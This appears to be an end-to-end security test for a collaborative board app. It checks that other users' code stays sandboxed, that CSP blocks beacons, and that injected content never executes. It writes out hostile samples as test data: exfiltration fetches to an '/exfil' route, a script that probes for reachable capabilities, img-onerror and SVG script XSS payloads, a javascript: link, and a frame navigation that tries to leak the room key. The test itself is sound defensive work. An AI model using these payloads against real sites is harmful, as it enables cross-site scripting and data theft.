// Code from another hand never runs without consent, and cannot reach your
// boards (the completeness critic's C1 and C6), as a scenario of the gate.
//
//     node e2e/run.mjs security
//
// This turns the critic's two probes (critic/jsrun.mjs, critic/xss.mjs) into
// records driven through the real surface. A hostile hand's log — a `js`
// behaviour and a `run` program it set playing, and injected names, labels,
// a region name, an svg `<script>`, a mermaid label and a page's code — is
// merged into a tab EXACTLY as a room's first sync merges it (`mergeLogs`
// with `{ me }`, then `session.load`), and then every pane is opened. What
// must hold:
//   - another hand's `js`, played by that hand's own clock, does not run in
//     this tab: no worker body, the log says it plays but this hand did not
//     play it here (C1);
//   - played HERE on purpose, the worker still cannot open `mm-boards`, fetch,
//     or reach caches/channels/nested workers — every capability it needs
//     none of is gone, so nothing is exfiltrated (the hardening, C1);
//   - another hand's `run` program does not auto-play, and a run program's
//     own fetch is refused by the frame's CSP (`connect-src 'none'`, C6);
//   - a run program that navigates its own frame — which no CSP governs —
//     carries nothing of the page's fragment (a room's key), even with its
//     own <base> taken away, and a frame that loads another page is stopped
//     where it stands (C6b);
//   - injected names, labels, a region name, an svg script, a mermaid label
//     and a page's code never execute (the srcdoc frames are script-less or
//     opaque-origin; xss.mjs);
//   - the launch-film example and a plain run program still play.
//
// It opens its own page (and a few probe routes), so it runs like keep/boards.

const APP = 'Demos/session-engine.html?fresh=1&nosw=1';

/** The hostile hand's log, built in the page from the core bundle, merged as a room merges. */
const BUILD_AND_MERGE = `(() => {
  const MM = window.__mm.MM, session = window.__mm.session;
  const hostile = MM.createSession();
  const hname = 'eve~zz';
  hostile.setLogName(hname);
  let at = Date.now();
  // A js behaviour that TRIES every capability a behaviour has no business
  // with, and beacons out only if one is reachable. Sealed, none is, so it
  // returns a force and nothing leaves.
  const jsCode = [
    'var reach = [];',
    'function tryIt(name, fn){ try { fn(); reach.push(name); } catch (e) {} }',
    "tryIt('fetch', function(){ fetch('/exfil?c=fetch'); });",
    "tryIt('xhr', function(){ var x = new XMLHttpRequest(); x.open('GET','/exfil?c=xhr'); x.send(); });",
    "tryIt('idb', function(){ indexedDB.open('mm-boards'); });",
    "tryIt('caches', function(){ caches.keys(); });",
    "tryIt('ws', function(){ new WebSocket('wss://example.invalid'); });",
    "tryIt('es', function(){ new EventSource('/exfil?c=es'); });",
    "tryIt('bc', function(){ new BroadcastChannel('x'); });",
    "tryIt('worker', function(){ new Worker('data:,'); });",
    "tryIt('import', function(){ importScripts('data:,'); });",
    "tryIt('blob', function(){ URL.createObjectURL(new Blob([''])); });",
    "tryIt('fn', function(){ (new Function('return this'))().fetch('/exfil?c=fn'); });",
    "tryIt('proto', function(){ var p = Object.getPrototypeOf(self); while (p) { var v = p.indexedDB; if (v) throw 0; p = Object.getPrototypeOf(p); } });",
    // import() is SYNTAX, not a global a denylist can seal — a module GET governed
    // by script-src. The host frame's CSP names no network host in script-src, so
    // it is refused and no /exfil request is ever seen (the robust fix for C6/C1).
    "try { Promise.resolve(import('/exfil?c=import&data=SECRET')).catch(function(){}); } catch (e) {}",
    "if (reach.length) { try { fetch('/exfil?reach=' + reach.join(',')); } catch (e) {} }",
    'self.__reached = reach.join(",");',
    // The force IS the count of capabilities reached, so a body that never moves
    // proves NONE was reachable — the gate reads that force (C1.2), not only the
    // fetch side-channel, which a sealed fetch would hide.
    'return { fx: reach.length, fy: 0 };',
  ].join('\\n');
  const jsId = hostile.import({ kind: 'js', path: 'fish.js', name: 'fish', bounds: { minX: 1000, minY: 100, maxX: 1120, maxY: 180 }, code: jsCode, at: at++ });
  hostile.clock({ nodeId: jsId, op: 'play', at: at++ });
  // A run program that beacons out the moment it loads: its frame's CSP must refuse it.
  const runCode = "fetch('/exfil?run=1'); mm.report('beacon', 0, 0, 40, 40);";
  const runId = hostile.import({ kind: 'run', path: 'p.run.js', name: 'prog', bounds: { minX: 1200, minY: 100, maxX: 1400, maxY: 260 }, code: runCode, at: at++ });
  hostile.clock({ nodeId: runId, op: 'play', at: at++ });
  const merged = MM.mergeLogs({ [session.logName() || 'me']: session.getEvents(), [hname]: hostile.getEvents() }, { me: session.logName() || 'me' });
  session.load(merged);
  // The ids are the merged board's own (minted from eve's authorship, shared by every hand).
  const live = session.getState().live;
  return { jsId: live.find((id) => { const n = session.getState().nodes.get(id); return n && n.reps.some((r) => r.modality === 'code' && r.data.kind === 'js'); }),
           runId: live.find((id) => { const n = session.getState().nodes.get(id); return n && n.reps.some((r) => r.modality === 'code' && r.data.kind === 'run'); }) };
})()`;

/** The XSS payloads: a hostile hand's names, labels, region, svg, mermaid and page, merged as a room merges. */
const XSS_MERGE = `(() => {
  const MM = window.__mm.MM, session = window.__mm.session;
  const P = (t) => '<img src=x onerror="(window.__pwn=window.__pwn||[]).push(\\'' + t + '\\')">';
  const hostile = MM.createSession();
  const hname = 'eve' + P('logname') + '~zz';
  hostile.setLogName(hname);
  let at = Date.now();
  const box = (x, y, w, h) => { const p = []; for (let i = 0; i <= 40; i++) p.push({ x: x + w * i / 40, y }); for (let i = 0; i <= 40; i++) p.push({ x: x + w, y: y + h * i / 40 }); for (let i = 0; i <= 40; i++) p.push({ x: x + w - w * i / 40, y: y + h }); for (let i = 0; i <= 40; i++) p.push({ x, y: y + h - h * i / 40 }); return p; };
  const s1 = hostile.addStroke(box(100, 100, 120, 80), at++, undefined, 1);
  const s2 = hostile.addStroke(box(300, 100, 120, 80), at++, undefined, 1);
  const s3 = hostile.addStroke(box(500, 100, 120, 80), at++, undefined, 1);
  hostile.label({ nodeId: s1, text: 'lab' + P('label'), at: at++ });
  hostile.region({ name: 'reg' + P('region'), bounds: { minX: 80, minY: 80, maxX: 450, maxY: 220 }, at: at++ });
  hostile.import({ kind: 'text', path: 'p' + P('path') + '.txt', name: 'nm' + P('importname'), bounds: { minX: 100, minY: 300, maxX: 400, maxY: 400 }, code: 'words ' + P('textcode'), at: at++ });
  hostile.import({ kind: 'svg', path: 'f.svg', name: 'svg' + P('svgname'), bounds: { minX: 450, minY: 300, maxX: 700, maxY: 400 }, code: '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="80"><text x="5" y="40">hi</text><script>parent.__pwnsvg=1<\\/script><foreignObject width="100" height="50"><div xmlns="http://www.w3.org/1999/xhtml">' + P('svgfo') + '</div></foreignObject></svg>', at: at++ });
  hostile.import({ kind: 'mermaid', path: 'd.mmd', name: 'mm' + P('mmname'), bounds: { minX: 100, minY: 450, maxX: 400, maxY: 600 }, code: 'flowchart TD\\n  a["' + P('mmlabel').replace(/"/g, '#quot;') + '"] --> b["x' + P('mmlabel2') + '"]', at: at++ });
  hostile.import({ kind: 'html', path: 'page.html', name: 'pg', bounds: { minX: 450, minY: 450, maxX: 700, maxY: 600 }, code: '<div data-region="r1">page ' + P('htmlcode') + '<a href="javascript:parent.__pwnhref=1">x</a></div>', at: at++ });
  // A kind no table holds, said over the panel's heading: the last thing made, so the panel inspects it unasked.
  hostile.import({ kind: 'x' + P('kind'), path: 'k.x', name: 'kd', bounds: { minX: 100, minY: 650, maxX: 400, maxY: 750 }, code: 'k', at: at++ });
  const pid = hostile.join('model', 'm' + P('modelname'), at++, 2, 'hosted');
  hostile.answer({ question: 'q' + P('question'), text: 'ans' + P('answer'), aboutIds: [s2], participantId: pid, at: at++ });
  const merged = MM.mergeLogs({ [session.logName() || 'me']: session.getEvents(), [hname]: hostile.getEvents() }, { me: session.logName() || 'me' });
  session.load(merged);
  return session.getState().artifacts.slice();
})()`;

export async function runSecurity(browser, servers, { freshContext, screenshot }) {
  const origin = servers.staticOrigin;
  const steps = [];
  const check = (name, ok, detail) => steps.push({ name, ok: !!ok, detail });
  const guards = await freshContext(browser, { origins: [origin], label: 'security' });
  const guardsList = [guards];
  // Every would-be beacon is caught here, and answered, so a call that leaves
  // is seen — and one the CSP or the hardening refused never arrives.
  const seen = [];
  // A navigation is answered with a page (C6b: a frame that leaves for one is stopped); anything else with nothing.
  await guards.context.route('**/exfil**', (route) => { const u = route.request().url(); seen.push(u); route.fulfill(/[?&]nav=/.test(u) ? { status: 200, contentType: 'text/html', body: '<p>elsewhere</p>' } : { status: 204, body: '' }); });
  const page = await guards.context.newPage();
  const pwn = [];
  page.on('dialog', (d) => { pwn.push('DIALOG ' + d.message()); d.dismiss(); });
  const ready = () => page.waitForFunction(() => window.__mm && window.__mm.session, null, { timeout: 60000 });
  const wait = (ms) => page.waitForTimeout(ms);
  const record = async (name, fn) => { try { await fn(); } catch (err) { check(`${name} — threw: ${String(err && err.message ? err.message : err).split('\n')[0]}`, false, { stack: String(err && err.stack) }); } };

  try {
    // ---- C1.0. A private board, so there is something to steal ----
    await record('C1.0', async () => {
      await page.goto(`${origin}/${APP}`, { waitUntil: 'load', timeout: 60000 });
      await ready();
      await page.mouse.move(240, 560); await page.mouse.down();
      for (const [x, y] of [[440, 560], [440, 660], [240, 660], [240, 562]]) for (let i = 0; i < 12; i++) await page.mouse.move(x, y, { steps: 1 });
      await page.mouse.up();
      await wait(1200);
      const marks = await page.evaluate(() => window.__mm.session.getState().contentIds.length);
      check('C1.0. a private board is drawn (a box kept in this browser)', marks >= 1, { marks });
    });

    // ---- C1.1. Another hand's js + run, merged as a room merges, do NOT run ----
    let ids = { jsId: null, runId: null };
    await record('C1.1', async () => {
      ids = await page.evaluate(BUILD_AND_MERGE);
      await wait(1500);
      const st = await page.evaluate((x) => {
        const s = window.__mm.session.getState();
        return {
          clockPlaying: !!(s.clocks[x.jsId] && s.clocks[x.jsId].playing),
          runPlaying: !!(s.clocks[x.runId] && s.clocks[x.runId].playing),
          playedHereJs: window.__mm.playedHere(x.jsId),
          playedHereRun: window.__mm.playedHere(x.runId),
          author: window.__mm.clockAuthor(x.jsId),
          bodies: window.__mm.runtime().bodies.size,
          // Whether the foreign run frame actually EXECUTED: its code calls
          // mm.report, so a reported part proves it ran. Zero = it never ran.
          reportedRun: window.__mm.reportedRegions(x.runId).length,
          status: (document.getElementById('status') && document.getElementById('status').textContent) || '',
        };
      }, ids);
      check('C1.1. the log says another hand’s js and run are playing (a pure function of the log, on every board)', st.clockPlaying && st.runPlaying, st);
      check('C1.1. but this hand did not play them here, so they do not run — no worker body, consent denied', !st.playedHereJs && !st.playedHereRun && st.bodies === 0, st);
      // The run side asserts EXECUTION, not the consent flag: the foreign run
      // program would report a part if it ran, so no reported part is proof the
      // opaque frame never executed its code (finding 4).
      check('C1.1. another hand’s run program did not execute — it reported no part', st.reportedRun === 0, { reportedRun: st.reportedRun });
      check('C1.1. and the board says, in the person’s words, who it is playing for', st.author === 'eve', { author: st.author });
      check('C1.1. the status line says the programs are standing by and how to run them', /play it here/.test(st.status), { status: st.status });
      check('C1.1. nothing was fetched while another hand’s program sat there unplayed', seen.length === 0, { seen });
    });

    // ---- C1.2. Played HERE on purpose, the worker still reaches nothing ----
    await record('C1.2', async () => {
      seen.length = 0;
      await page.evaluate((x) => window.__mm.playHere(x.jsId), ids);
      await wait(400);
      // Step it a few times through the test hook, so the probe actually runs.
      await page.evaluate(async (x) => { for (let i = 0; i < 8; i++) { try { await window.__mm.runtime().stepOnce(x.jsId); } catch (e) {} } }, ids);
      await wait(600);
      const st = await page.evaluate((x) => {
        const s = window.__mm.session.getState();
        const body = window.__mm.runtime().bodies.get(x.jsId);
        // The behaviour returns a force equal to the number of capabilities it
        // reached, so a body that never gained velocity proves it reached none —
        // read directly from the force, not through the fetch side-channel a
        // sealed fetch would hide (finding 3).
        return { playedHere: window.__mm.playedHere(x.jsId), ran: !!body, clock: s.clocks[x.jsId], vx: body ? body.vx : null, x: body ? body.x : null };
      }, ids);
      check('C1.2. played here, the worker runs — consent is this hand’s deliberate act', st.playedHere && st.ran, st);
      check('C1.2. the behaviour reached no capability — its force stayed zero, so the body never moved (read from the force, not the fetch channel)', st.ran && Math.abs(st.vx) < 1e-9 && Math.abs(st.x) < 1e-9, { vx: st.vx, x: st.x });
      check('C1.2. and no network GET left the worker — fetch, XHR, EventSource and a dynamic import() beacon all refused — the box’s private records never leave', seen.length === 0, { seen });
    });

    // ---- C1.3. Undo per hand still stops it ----
    await record('C1.3', async () => {
      await page.evaluate(() => window.__mm.session.undo());
      await wait(300);
      const st = await page.evaluate((x) => { const s = window.__mm.session.getState(); return { playing: !!(s.clocks[x.jsId] && s.clocks[x.jsId].playing), playedHere: window.__mm.playedHere(x.jsId), author: window.__mm.clockAuthor(x.jsId) }; }, ids);
      // Undo drops this hand's own play (per hand); the clock falls back to
      // eve's play (still playing in the log), the consent is gone, so it no
      // longer runs here.
      check('C1.3. undo takes back this hand’s own play — it stops running here, and the board says it is eve’s again', !st.playedHere && st.author === 'eve', st);
    });

    // ---- C6. A run program's own fetch is refused by the frame's CSP ----
    await record('C6', async () => {
      seen.length = 0;
      // mm.report first (so the frame is seen to run), then a beacon that the
      // CSP must refuse — swallowed so its refusal is not an uncaught error.
      const rid = await page.evaluate(() => {
        const s = window.__mm.session;
        const code = "mm.report('out', 0, 0, 40, 40); try { fetch('/exfil?run=local').catch(function(){}); } catch (e) {}";
        const id = s.import({ kind: 'run', path: 'beacon.run.js', name: 'beacon', bounds: { minX: 2000, minY: 100, maxX: 2200, maxY: 240 }, code: code, at: Date.now() });
        s.clock({ nodeId: id, op: 'play', at: Date.now() });
        return id;
      });
      await wait(1500);
      const reported = await page.evaluate((id) => window.__mm.reportedRegions(id).length, rid);
      // The frame is opaque-origin, so its document cannot be read from here; the
      // CSP lives in the srcdoc the page handed it, readable as an attribute.
      const csp = await page.evaluate(() => {
        for (const f of document.querySelectorAll('iframe')) {
          const doc = f.getAttribute('srcdoc') || '';
          // The behaviour worker's own host iframe carries connect-src 'none'
          // too; this record is about the RUN frame, so skip the worker host.
          if (/new Worker\(/.test(doc)) continue;
          const m = doc.match(/Content-Security-Policy"\s+content="([^"]*)"/);
          if (m && /connect-src 'none'/.test(m[1].replace(/&#39;|&apos;/g, "'").replace(/&quot;/g, '"'))) return m[1];
        }
        return null;
      });
      check('C6. a local run program runs under the frame’s CSP (it reports its part)', reported >= 1, { reported });
      check('C6. its fetch is refused by connect-src ‘none’ — nothing leaves the opaque-origin frame', seen.filter((u) => /run=local/.test(u)).length === 0, { seen });
      check('C6. a run frame carries a CSP with connect-src ‘none’', !!csp && /connect-src 'none'/.test(csp), { csp });
    });

    // ---- C6b. A run program that navigates its own frame — the one way out a CSP does not govern — carries nothing of
    // the page's address (the room's key lives in its fragment, and the page's <base> holds none), and is stopped ----
    await record('C6b', async () => {
      seen.length = 0;
      await page.evaluate(() => history.replaceState(history.state, '', location.pathname + location.search + '#key=GATEROOMKEY0123456789'));
      const rid = await page.evaluate(() => {
        const s = window.__mm.session;
        // It even takes its own <base> away first, so the frame falls back to whatever base it was made with.
        const code = "mm.report('nav', 0, 0, 40, 40); setInterval(function(){ try { var b = document.querySelectorAll('base'); for (var i = 0; i < b.length; i++) b[i].remove(); location.href = '/exfil?nav=' + encodeURIComponent(document.baseURI + ' ' + document.referrer); } catch (e) {} }, 250);";
        const id = s.import({ kind: 'run', path: 'leave.run.js', name: 'leave', bounds: { minX: 2400, minY: 100, maxX: 2600, maxY: 240 }, code: code, at: Date.now() });
        s.clock({ nodeId: id, op: 'play', at: Date.now() });
        return id;
      });
      await wait(2000);
      const st = await page.evaluate((id) => { const c = window.__mm.session.getState().clocks[id]; return { playing: !!(c && c.playing), reason: c && c.reason, base: document.baseURI }; }, rid);
      const navs = seen.filter((u) => /nav=/.test(u));
      await page.evaluate(() => history.replaceState(history.state, '', location.pathname + location.search));
      check('C6b. a run program’s navigation of its own frame carries nothing of the page’s fragment — not the room’s key, even with its <base> taken away — and the page’s own base holds none',
        navs.length >= 1 && navs.every((u) => !/GATEROOMKEY/.test(decodeURIComponent(u))) && !/GATEROOMKEY/.test(st.base), { navs, base: st.base });
      // A page that answers 204 keeps the frame where it was — nothing loads, so nothing is seen to leave; that a
      // program can still say what it knows by asking for an address is what the <base> answers, above.
      check('C6b. a frame that loads another page is stopped where it stands, and says so — once it has left, it leaves no more',
        !st.playing && /tried to load another page in its frame/.test(st.reason || '') && navs.length === 1, { st, navs: navs.length });
    });

    // ---- C1.4. A grant is for the code it was given to: another hand's new version of a program this hand plays
    // does not run here until this hand plays it again ----
    await record('C1.4', async () => {
      const st = await page.evaluate(async () => {
        const mm = window.__mm, session = mm.session;
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
        let at = Date.now();
        const runId = session.import({ kind: 'run', path: 'mine.run.js', name: 'mine', bounds: { minX: 2800, minY: 100, maxX: 3000, maxY: 260 }, code: "mm.report('mine', 0, 0, 40, 40);", at: at++ });
        session.clock({ nodeId: runId, op: 'play', at: at++ });
        const jsId = session.import({ kind: 'js', path: 'mine.js', name: 'minefish', bounds: { minX: 3100, minY: 100, maxX: 3200, maxY: 160 }, code: 'return { fx: 0, fy: 0 };', at: at++ });
        session.clock({ nodeId: jsId, op: 'play', at: at++ });
        await sleep(1200);
        const before = { run: mm.playedHere(runId), parts: mm.reportedRegions(runId).map((p) => p.id), js: mm.playedHere(jsId) };
        // bob, in the room, writes a new version of each (his log's code events, a line that appends).
        session.rebase(session.getEvents().length, [
          { type: 'code', nodeId: runId, code: "mm.report('bobs', 0, 0, 40, 40);", kind: 'run', language: 'run', at: at++, origin: 'bob~b1', seq: 1, by: 'bob~b1' },
          { type: 'code', nodeId: jsId, code: 'return { fx: 500, fy: 0 };', kind: 'js', language: 'js', at: at++, origin: 'bob~b1', seq: 2, by: 'bob~b1' },
        ]);
        await sleep(1500);
        for (let i = 0; i < 4; i++) { try { await mm.runtime().stepOnce(jsId); } catch (e) {} }
        const b = mm.runtime().bodies.get(jsId);
        const f = mm.frames && mm.frames.get(runId);
        const after = { run: mm.playedHere(runId), parts: mm.reportedRegions(runId).map((p) => p.id), js: mm.playedHere(jsId), vx: b ? b.vx : 0,
          standing: !!(f && f.wrap.classList.contains('playing-elsewhere')) };
        // Play it here: the person's own play of the version that stands, which then runs.
        mm.playHere(runId);
        await sleep(1500);
        const again = { run: mm.playedHere(runId), parts: mm.reportedRegions(runId).map((p) => p.id) };
        return { before, after, again };
      });
      check('C1.4. this hand’s own program and behaviour, played here, run', st.before.run && st.before.js && st.before.parts.includes('mine'), st.before);
      check('C1.4. another hand’s new version of each does not run here — its code never ran, the behaviour moves nothing, and the program stands by, dashed, for Play it here',
        !st.after.run && !st.after.js && !st.after.parts.includes('bobs') && st.after.vx === 0 && st.after.standing, st.after);
      check('C1.4. Play it here runs the version that stands, by the person’s own act', st.again.run && st.again.parts.includes('bobs'), st.again);
    });

    // ---- C1.5. A grant holds while this hand's own play stands: another hand playing it too, then an undo of
    // something else (or a late line that cuts the board), leaves it running here ----
    await record('C1.5', async () => {
      const st = await page.evaluate(async () => {
        const mm = window.__mm, session = mm.session;
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
        let at = Date.now();
        const runId = session.import({ kind: 'run', path: 'ours.run.js', name: 'ours', bounds: { minX: 2800, minY: 400, maxX: 3000, maxY: 560 }, code: "mm.report('ours', 0, 0, 40, 40);", at: at++ });
        session.clock({ nodeId: runId, op: 'play', at: at++ });
        const pts = []; for (let i = 0; i <= 30; i++) pts.push({ x: 2800 + i * 4, y: 700 });
        session.addStroke(pts, at++, undefined, 1);
        session.rebase(session.getEvents().length, [{ type: 'clock', nodeId: runId, op: 'play', at: at++, origin: 'bob~b1', seq: 3, by: 'bob~b1' }]);
        await sleep(400);
        const both = { here: mm.playedHere(runId), author: mm.clockAuthor(runId) };
        session.undo();
        await sleep(500);
        const undone = { here: mm.playedHere(runId), playing: session.getState().clocks[runId].playing };
        const evs = session.getEvents(), i = evs.length - 1;
        session.rebase(i, [{ type: 'stroke', id: 'late', points: pts.map((p) => ({ x: p.x, y: p.y + 80 })), at: evs[i].at - 1, origin: 'bob~b1', seq: 4, by: 'bob~b1', scale: 1 }, evs[i]]);
        await sleep(500);
        return { both, undone, cut: { here: mm.playedHere(runId) } };
      });
      check('C1.5. another hand playing this hand’s program too leaves it running here; so does an undo of an unrelated stroke, and a late line of theirs that cuts the board',
        st.both.here && st.both.author === 'bob' && st.undone.here && st.undone.playing && st.cut.here, st);
    });

    // ---- XSS. Injected names, labels, svg/mermaid/page never execute ----
    await record('XSS', async () => {
      await page.goto(`${origin}/${APP}`, { waitUntil: 'load', timeout: 60000 });
      await ready();
      await page.evaluate(XSS_MERGE);
      await wait(1200);
      // Open panes, hover and select every artifact, so any injected handler that was going to fire would.
      await page.evaluate(() => { const s = window.__mm.session.getState(); for (const id of s.artifacts) window.__mm.session.select([id], Date.now()); });
      for (const [x, y] of [[160, 140], [360, 140], [560, 140], [250, 350], [570, 350], [250, 520], [570, 520], [250, 700]]) { await page.mouse.move(x, y); await wait(80); }
      await page.evaluate(() => document.querySelectorAll('details').forEach((d) => (d.open = true)));
      await page.keyboard.press('/'); await wait(200); await page.keyboard.type('lab'); await wait(600); await page.keyboard.press('Escape');
      await wait(400);
      const got = await page.evaluate(() => ({ pwn: window.__pwn || [], svg: window.__pwnsvg || 0, href: window.__pwnhref || 0 }));
      check('XSS. no injected name, label, region, kind, svg, mermaid or page handler ever ran', got.pwn.length === 0 && got.svg === 0 && got.href === 0 && pwn.length === 0, { got, dialogs: pwn });
    });

    // ---- The launch-film example still plays (a shipped program runs in a board of your own) ----
    await record('film', async () => {
      // The real path: ?example=story on a board that keeps boards opens the
      // example as a board of your own (openExample → newBoard → the trusted
      // grant). The film's run program is dyna.ink's own, so it is granted
      // and plays — the video cannot load over plain http here, but the run
      // harness runs, which is what proves a shipped program still plays.
      const reach = await page.evaluate(() => fetch('../boards/examples/story.jsonl', { cache: 'no-cache' }).then((r) => r.ok).catch(() => false));
      if (!reach) { check('film — skipped: the story example is not reachable on this server', true, { reach }); return; }
      await page.goto(`${origin}/app/?example=story&nosw=1`, { waitUntil: 'load', timeout: 60000 });
      await ready();
      let st = { runs: 0, playedHere: [] };
      for (let i = 0; i < 40; i++) {
        st = await page.evaluate(() => {
          const s = window.__mm.session.getState();
          const runs = s.live.filter((id) => { const n = s.nodes.get(id); const rep = n && n.reps.filter((r) => r.modality === 'code').pop(); return rep && rep.data.kind === 'run' && s.clocks[id] && s.clocks[id].playing; });
          return { runs: runs.length, playedHere: runs.map((id) => window.__mm.playedHere(id)) };
        });
        if (st.runs >= 1) break;
        await wait(250);
      }
      check('film. the launch-film example’s run program is granted and plays in a board of your own', st.runs >= 1 && st.playedHere.every(Boolean), st);
    });
  } catch (err) {
    check('security — harness threw', false, { stack: String(err && err.stack ? err.stack : err) });
    if (page) await screenshot(page, 'security');
  }
  if (page && steps.some((s) => !s.ok)) await screenshot(page, 'security');
  return { steps, guards: guardsList };
}
